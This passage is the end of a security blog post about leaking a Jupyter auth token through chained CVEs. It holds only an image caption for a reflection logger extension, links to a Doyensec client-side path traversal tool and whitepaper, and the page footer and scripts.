            alt="/2023/08/cve-2023-39968-jupyter-token-leak/reflection-logger.png" />
    </a><figcaption class="image-caption">reflection logger extension</figcaption>
    </figure></p>
<p>The extension is at a very early stage, so if you want a more stable tool please use Burp Suite extension at <a href="https://github.com/doyensec/CSPTBurpExtension" target="_blank" rel="noopener noreffer">https://github.com/doyensec/CSPTBurpExtension</a>, introduced by an amazing research whitepaper by Doyensec team <a href="https://www.doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf" target="_blank" rel="noopener noreffer">https://www.doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf</a>. Check it out for more CSPT techniques.</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 03-07-2024</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2023/08/cve-2023-39968-jupyter-token-leak/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/" data-title="Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug" data-hashtags="open redirect,client side path traversal,chromium,python,javascript"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/" data-hashtag="open redirect"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/" data-title="Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/"><i class="fab fa-reddit fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/open-redirect/">open redirect</a>,&nbsp;<a href="/tags/client-side-path-traversal/">client side path traversal</a>,&nbsp;<a href="/tags/chromium/">chromium</a>,&nbsp;<a href="/tags/python/">python</a>,&nbsp;<a href="/tags/javascript/">javascript</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2022/08/offzone-express-notes/" class="prev" rel="prev" title="Express notes - &#34;OFFZONE&#34; express file upload challenge"><i class="fas fa-angle-left fa-fw"></i>Express notes - &#34;OFFZONE&#34; express file upload challenge</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/davwwwx" target="_blank">davwwwx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@13.0.0/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":70},"comment":{},"data":{"id-1":"/blog.xss.am/","id-2":"/blog.xss.am/"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.f0e4096f68a24e87589ba7942f64874a24befc1ce05399522b0178ac9d3fb20b351b96e095dd6b5bfbe89cb6834a4b3a.js" integrity="sha384-8OQJb2iiTodYm6eUL2SHSiS&#43;/BzgU5lSKwF4rJ0/sgs1G5bgld1rW/vonLaDSks6"></script></body>
</html>
